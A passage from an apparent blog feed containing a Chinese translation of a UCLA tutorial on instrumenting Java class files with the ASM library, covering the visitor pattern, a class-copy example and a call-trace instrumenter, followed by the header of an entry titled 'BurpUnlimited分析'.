class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DownVisitor</span> <span class="keyword">implements</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( This e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Down on "</span> + e.thiss() );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( That e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Down on "</span> + e.that() );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( TheOther e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Down on "</span> + e.theOther() );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VisitorDemo</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Element[] list = &#123; <span class="keyword">new</span> This(), <span class="keyword">new</span> That(), <span class="keyword">new</span> TheOther() &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 4. Client creates "visitor" objects and passes each to accept() calls</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">      UpVisitor    up   = <span class="keyword">new</span> UpVisitor();</span><br><span class="line">      DownVisitor  down = <span class="keyword">new</span> DownVisitor();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">         list[i].accept( up );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">         list[i].accept( down );</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> Up on This                <span class="keyword">do</span> Down on This</span><br><span class="line"><span class="keyword">do</span> Up on That                <span class="keyword">do</span> Down on That</span><br><span class="line"><span class="keyword">do</span> Up on TheOther            <span class="keyword">do</span> Down on TheOther</span><br></pre></td></tr></table></figure></p><h3 id="ASM中的访问者模式"><a href="#ASM中的访问者模式" class="headerlink" title="ASM中的访问者模式"></a>ASM中的访问者模式</h3><p>ASM使用访问者模式，ClassReader类和MethodNode类都是被访问的，访问者接口包括ClassVistor,AnnotationVisitor,FieldVistor和MethodVistor。<br>accept()方法属于MethodNode，它的定义如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(ClassVisitor cv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(MethodVisitor mv)</span></span></span><br></pre></td></tr></table></figure></p><p>visit()方法族，例如visitField()，是ClassVistor的一部分，他们的定义如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature, String superName, String[] interfaces)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(String desc, <span class="keyword">boolean</span> visible)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visitAttribute</span><span class="params">(Attribute attr)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, Object value)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visitSource</span><span class="params">(String source, String debug)</span></span></span><br></pre></td></tr></table></figure></p><p><img src="http://web.cs.ucla.edu/~msb/cs239-tutorial/images/image01.gif" alt="171227_03.gif"></p><h2 id="实现调用链跟踪插桩"><a href="#实现调用链跟踪插桩" class="headerlink" title="实现调用链跟踪插桩"></a>实现调用链跟踪插桩</h2><p>在这一部分我们会使用ASM实现一个调用链跟踪。插桩代码会打印出每个方法调用和返回，用这些输出很容易就能解析成上下文调用树。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>你需要安装好JDK和Apache Ant，实例代码在<a href="http://web.cs.ucla.edu/~msb/cs239-tutorial/ASM-tutorial.zip" target="_blank" rel="noopener">这里</a>，还需要<a href="http://download.forge.ow2.org/asm/asm-5.0.3-bin.zip" target="_blank" rel="noopener">这里</a>的asm库。把它们解压，复制asm-all-5.0.3.jar到tutorial文件夹<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> unzip ASM-tutorial.zip</span><br><span class="line"><span class="meta">$</span> unzip asm-5.0.3-bin.zip</span><br><span class="line"><span class="meta">$</span> cp asm-5.0.3/lib/all/asm-all-5.0.3.jar ASM-tutorial/</span><br></pre></td></tr></table></figure></p><h3 id="Hello-ASM：class文件复制"><a href="#Hello-ASM：class文件复制" class="headerlink" title="Hello ASM：class文件复制"></a>Hello ASM：class文件复制</h3><p>我们的第一个ASM程序是简单的复制.class文件，这个项目可以作为后面更复杂有趣的实现的样板。Copy.java如下所示<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Copy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileInputStream is = <span class="keyword">new</span> FileInputStream(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(is);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        cr.accept(cw, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(args[<span class="number">1</span>]);</span><br><span class="line">        fos.write(cw.toByteArray());</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>复制程序接收两个命令行参数，args[0]是要复制的源文件文件名，args[1]是复制后生成的文件名。</p><p>我们使用了两个ASM类，<a href="http://asm.ow2.org/asm50/javadoc/user/org/objectweb/asm/ClassReader.html" target="_blank" rel="noopener">ClassReader</a>从文件中读入Java字节码，<a href="http://asm.ow2.org/asm50/javadoc/user/org/objectweb/asm/ClassWriter.html" target="_blank" rel="noopener">ClassWriter</a>把字节码写入文件。ASM使用访问者模式：ClassWriter实现<a href="http://asm.ow2.org/asm50/javadoc/user/org/objectweb/asm/ClassVisitor.html" target="_blank" rel="noopener">ClassVistor</a>接口，然后通过cr.accept(cw,0)使ClassReader在遍历字节码的过程中调用cw，生成同样的字节码。</p><p>ClassWriter.COMPUTE_FRAMES参数表示ClassWriter自动计算栈帧的长度。cr.accept()的第二个参数表示默认行为，详情可以查看ClassReader和ClassWriter的java文档。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Compile Copy</span><br><span class="line">$ javac -cp asm-all-5.0.3.jar Copy.java</span><br><span class="line"></span><br><span class="line"># Use Copy to copy itself</span><br><span class="line">$ java -cp .:asm-all-5.0.3.jar Copy Copy.class Copy2.class</span><br></pre></td></tr></table></figure></p><blockquote><p>译者注：Linux中环境变量的分隔符是：，Windows底下的是;。</p></blockquote><h3 id="调用链跟踪"><a href="#调用链跟踪" class="headerlink" title="调用链跟踪"></a>调用链跟踪</h3><p>现在我们熟悉了ASM的基本用法，下面我们来实现调用链跟踪。每个函数被调用前后，调用信息会输出到stderr。例如：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        printOne();</span><br><span class="line">        printOne();</span><br><span class="line">        printTwo();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printTwo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        printOne();</span><br><span class="line">        printOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们会在函数调用前后把调用信息输出到stderr，插桩完毕后上述代码应该等同于下面的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInstrumented</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.err.println(<span class="string">"CALL printOne"</span>);</span><br><span class="line">        printOne();</span><br><span class="line">        System.err.println(<span class="string">"RETURN printOne"</span>);</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"CALL printOne"</span>);</span><br><span class="line">        printOne();</span><br><span class="line">        System.err.println(<span class="string">"RETURN printOne"</span>);</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"CALL printTwo"</span>);</span><br><span class="line">        printTwo();</span><br><span class="line">        System.err.println(<span class="string">"RETURN printTwo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.err.println(<span class="string">"CALL println"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">        System.err.println(<span class="string">"RETURN println"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printTwo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.err.println(<span class="string">"CALL printOne"</span>);</span><br><span class="line">        printOne();</span><br><span class="line">        System.err.println(<span class="string">"RETURN printOne"</span>);</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"CALL printOne"</span>);</span><br><span class="line">        printOne();</span><br><span class="line">        System.err.println(<span class="string">"RETURN printOne"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们通过修改上面的Copy来实现，为了修改class文件，我们需要在ClassReader和ClassWriter中间插入某些代码。我们会用<a href="http://en.wikipedia.org/wiki/Adapter_pattern" target="_blank" rel="noopener">适配器模式</a>。适配器包裹一个对象，重写一些方法。这让我们修改被包裹的对象的行为变得很简单。在这里我们会适配ClassWriter，在方法调用前后插入打印代码。</p><p>鉴于方法的调用在方法中，我们的插桩会在方法声明处。这会有点复杂，因为方法声明在类中，所以我们需要遍历一个类来对它的方法插桩。</p><p>我们第一步用下面的ClassAdapter类适配ClassWriter。默认情况下，继承自ClassVistor的ClassAdapter的方法只会调用ClassWriter中的同一个方法。大多数情况我们想要这样。我们只会覆盖ClassWriter.visitMethod方法，每声明一个方法visitMethod就会被调用一次。它的返回值是处理方法体的MethodVistor对象。我们会适配ClassWriter.visitMethod返回的MethodVisitor，插入其他的指令来输出调用信息。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">lass ClassAdapter extends ClassVisitor implements Opcodes &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassAdapter</span><span class="params">(<span class="keyword">final</span> ClassVisitor cv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ASM5, cv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> access, <span class="keyword">final</span> String name,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">final</span> String desc, <span class="keyword">final</span> String signature, <span class="keyword">final</span> String[] exceptions)</span> </span>&#123;</span><br><span class="line">        MethodVisitor mv = cv.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">return</span> mv == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">new</span> MethodAdapter(mv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodAdapter</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> <span class="keyword">implements</span> <span class="title">Opcodes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodAdapter</span><span class="params">(<span class="keyword">final</span> MethodVisitor mv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ASM5, mv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> System.err.println("CALL" + name); */</span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* do call */</span></span><br><span class="line">        mv.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> System.err.println("RETURN" + name);  */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>目前为止，我们的MethodAdapter没有加任何指令。我们很清楚用Java语法如何实现我们的功能，但是我们不知道怎么用ASM API实现它，因此，我们需要使用ASMifier工具。</p><p>我们可以使用ASMifiter将TestInstrumented中的代码转换成ASM API调用。为了简介，我们省略了一些代码<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> javac TestInstrumented.java</span><br><span class="line"><span class="meta">$</span> java -cp .:asm-all-5.0.3.jar org.objectweb.asm.util.ASMifier TestInstrumented</span><br><span class="line">/** WARNING: THINGS ARE ELIDED **/</span><br><span class="line">&#123;</span><br><span class="line">mv = cw.visitMethod(ACC_PUBLIC + ACC_STATIC, "printOne", "()V", null, null);</span><br><span class="line">mv.visitCode();</span><br><span class="line"></span><br><span class="line">mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");</span><br><span class="line">mv.visitLdcInsn("CALL println");</span><br><span class="line">mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);</span><br><span class="line"></span><br><span class="line">mv.visitFieldInsn(GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");</span><br><span class="line">mv.visitLdcInsn("Hello World");</span><br><span class="line">mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);</span><br><span class="line"></span><br><span class="line">mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");</span><br><span class="line">mv.visitLdcInsn("RETURN println");</span><br><span class="line">mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);</span><br><span class="line"></span><br><span class="line">mv.visitInsn(RETURN);</span><br><span class="line">mv.visitMaxs(2, 0);</span><br><span class="line">mv.visitEnd();</span><br><span class="line">&#125;</span><br><span class="line">/** WARNING: MORE THINGS ARE ELIDED **/</span><br></pre></td></tr></table></figure></p><p>ASMfiter的输出是与TestInstrumented功能相同的ASM程序。从这个程序中，我们可以知道”System.err.println”的ASM API如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv.visitFieldInsn(GETSTATIC, <span class="string">"java/lang/System"</span>, <span class="string">"err"</span>, <span class="string">"Ljava/io/PrintStream;"</span>);</span><br><span class="line">mv.visitLdcInsn(<span class="string">"CALL println"</span>);</span><br><span class="line">mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">"java/io/PrintStream"</span>, <span class="string">"println"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></p><p>现在我们可以完成MethodAdapter的实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodAdapter</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> <span class="keyword">implements</span> <span class="title">Opcodes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodAdapter</span><span class="params">(<span class="keyword">final</span> MethodVisitor mv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ASM5, mv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* System.err.println("CALL" + name); */</span></span><br><span class="line">        mv.visitFieldInsn(GETSTATIC, <span class="string">"java/lang/System"</span>, <span class="string">"err"</span>, <span class="string">"Ljava/io/PrintStream;"</span>);</span><br><span class="line">        mv.visitLdcInsn(<span class="string">"CALL "</span> + name);</span><br><span class="line">        mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">"java/io/PrintStream"</span>, <span class="string">"println"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* do call */</span></span><br><span class="line">        mv.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* System.err.println("RETURN" + name);  */</span></span><br><span class="line">        mv.visitFieldInsn(Opcodes.GETSTATIC, <span class="string">"java/lang/System"</span>, <span class="string">"err"</span>, <span class="string">"Ljava/io/PrintStream;"</span>);</span><br><span class="line">        mv.visitLdcInsn(<span class="string">"RETURN "</span> + name);</span><br><span class="line">        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">"java/io/PrintStream"</span>, <span class="string">"println"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>搞定了，在例子Test上试验一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Build Instrumenter</span><br><span class="line"><span class="meta">$</span> javac -cp asm-all-5.0.3.jar Instrumenter.java</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Build Example</span><br><span class="line"><span class="meta">$</span> javac Test.java</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Move Test.class out of the way</span><br><span class="line"><span class="meta">$</span> cp Test.class Test.class.bak</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Instrument Test</span><br><span class="line"><span class="meta">$</span> java -cp .:asm-all-5.0.3.jar Instrumenter Test.class.bak Test.class</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Run!</span><br><span class="line"><span class="meta">$</span> java Test</span><br><span class="line">CALL printOne</span><br><span class="line">CALL println</span><br><span class="line">Hello World</span><br><span class="line">RETURN println</span><br><span class="line">RETURN printOne</span><br><span class="line">CALL printOne</span><br><span class="line">CALL println</span><br><span class="line">Hello World</span><br><span class="line">RETURN println</span><br><span class="line">RETURN printOne</span><br><span class="line">CALL printTwo</span><br><span class="line">CALL printOne</span><br><span class="line">CALL println</span><br><span class="line">Hello World</span><br><span class="line">RETURN println</span><br><span class="line">RETURN printOne</span><br><span class="line">CALL printOne</span><br><span class="line">CALL println</span><br><span class="line">Hello World</span><br><span class="line">RETURN println</span><br><span class="line">RETURN printOne</span><br><span class="line">RETURN printTwo</span><br></pre></td></tr></table></figure></p><p>输出正如我们期望。</p><h3 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h3><p>现在你知道如何初步使用ASM了，更多内容可以参考</p><ul><li><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM Homepage</a></li><li><a href="http://download.forge.ow2.org/asm/asm-5.0.3-bin.zip" target="_blank" rel="noopener">ASM 5.0.3 Binary Distribution</a></li><li><a href="http://download.forge.objectweb.org/asm/asm4-guide.pdf" target="_blank" rel="noopener">User Guide</a></li><li><a href="http://asm.ow2.org/asm50/javadoc/user/index.html" target="_blank" rel="noopener">ASM JavaDoc</a></li></ul><blockquote><p>译者注：官方文档是最好的文档。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;翻译自 &lt;a href=&quot;http://web.cs.ucla.edu/~msb/cs239-tutorial/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.cs.ucla.edu/~msb/cs239-tutorial/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这篇文章中，你将学会如何使用ASM框架对java class文件插桩。文章第一部分介绍Java字节码以及如何阅读class文件。第二部分介绍贯穿ASM框架的vistor模式。第三部分我们将用ASM构建一个简单的调用链跟踪插桩。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://c0d3p1ut0s.github.io/tags/Java/"/>
    
      <category term="JVM" scheme="http://c0d3p1ut0s.github.io/tags/JVM/"/>
    
      <category term="Java字节码" scheme="http://c0d3p1ut0s.github.io/tags/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>BurpUnlimited分析</title>
    <link href="http://c0d3p1ut0s.github.io/BurpUnlimited%E5%88%86%E6%9E%90/"/>
    <id>http://c0d3p1ut0s.github.io/BurpUnlimited分析/</id>
    <published>2017-12-14T14:56:46.000Z</published>
    <updated>2018-03-05T11:29:15.000Z</updated>
    
